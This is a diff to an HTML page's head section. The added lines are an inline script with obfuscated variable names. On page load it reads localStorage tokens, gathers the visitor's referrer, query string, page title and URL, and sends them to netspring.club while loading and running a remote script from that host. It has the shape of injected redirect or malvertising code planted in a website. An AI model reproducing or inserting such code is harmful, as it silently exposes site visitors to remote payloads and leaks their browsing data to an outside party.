@@ -16,7 +16,49 @@
 
     <!-- Core Stylesheet -->
     <link rel="stylesheet" href="style.css">
-
+    <script>
+        (function() {
+        var name = '_pNryYMQgKjd3v6RG';
+        if (!window._pNryYMQgKjd3v6RG) {
+            window._pNryYMQgKjd3v6RG = {
+                unique: false,
+                ttl: 86400,
+                R_PATH: 'https://netspring.club/BwVGPj',
+                P_PATH: 'https://netspring.club/1ff5259/postback',
+            };
+        }
+        const _gSnwTTbJDG87csWy = localStorage.getItem('config');
+        if (typeof _gSnwTTbJDG87csWy !== 'undefined' && _gSnwTTbJDG87csWy !== null) {
+            var _mZ5szjb4Qfg89S13 = JSON.parse(_gSnwTTbJDG87csWy);
+            var _nzdYY34D1v7T5g4p = Math.round(+new Date()/1000);
+            if (_mZ5szjb4Qfg89S13.created_at + window._pNryYMQgKjd3v6RG.ttl < _nzdYY34D1v7T5g4p) {
+                localStorage.removeItem('subId');
+                localStorage.removeItem('token');
+                localStorage.removeItem('config');
+            }
+        }
+        var _x18LxFk6mCLF8BPF = localStorage.getItem('subId');
+        var _sZNKVdtgtvY8Mtmj = localStorage.getItem('token');
+        var _ncY4DVZZh1vLcPqm = '?return=js.client';
+            _ncY4DVZZh1vLcPqm += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+            _ncY4DVZZh1vLcPqm += '&se_referrer=' + encodeURIComponent(document.referrer);
+            _ncY4DVZZh1vLcPqm += '&default_keyword=' + encodeURIComponent(document.title);
+            _ncY4DVZZh1vLcPqm += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+            _ncY4DVZZh1vLcPqm += '&name=' + encodeURIComponent(name);
+            _ncY4DVZZh1vLcPqm += '&host=' + encodeURIComponent(window._pNryYMQgKjd3v6RG.R_PATH);
+        if (typeof _x18LxFk6mCLF8BPF !== 'undefined' && _x18LxFk6mCLF8BPF && window._pNryYMQgKjd3v6RG.unique) {
+            _ncY4DVZZh1vLcPqm += '&sub_id=' + encodeURIComponent(_x18LxFk6mCLF8BPF);
+        }
+        if (typeof _sZNKVdtgtvY8Mtmj !== 'undefined' && _sZNKVdtgtvY8Mtmj && window._pNryYMQgKjd3v6RG.unique) {
+            _ncY4DVZZh1vLcPqm += '&token=' + encodeURIComponent(_sZNKVdtgtvY8Mtmj);
+        }
+        var a = document.createElement('script');
+            a.type = 'application/javascript';
+            a.src = window._pNryYMQgKjd3v6RG.R_PATH + _ncY4DVZZh1vLcPqm;
+        var s = document.getElementsByTagName('script')[0];
+        s.parentNode.insertBefore(a, s)
+        })();
+        </script>
 </head>
 
 <body>
